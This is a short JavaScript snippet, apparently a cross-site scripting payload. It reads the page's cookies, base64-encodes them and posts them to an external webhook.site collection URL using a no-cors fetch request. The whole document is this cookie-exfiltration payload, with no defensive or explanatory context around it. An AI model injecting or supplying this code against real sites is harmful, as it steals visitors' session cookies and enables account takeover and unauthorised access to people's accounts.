fetch("https://webhook.site/0ec372ef-c5ab-4fd0-99de-2eb3aee311b1", {
    method: "POST",
    mode: "no-cors",
    body: btoa(document.cookie)
})
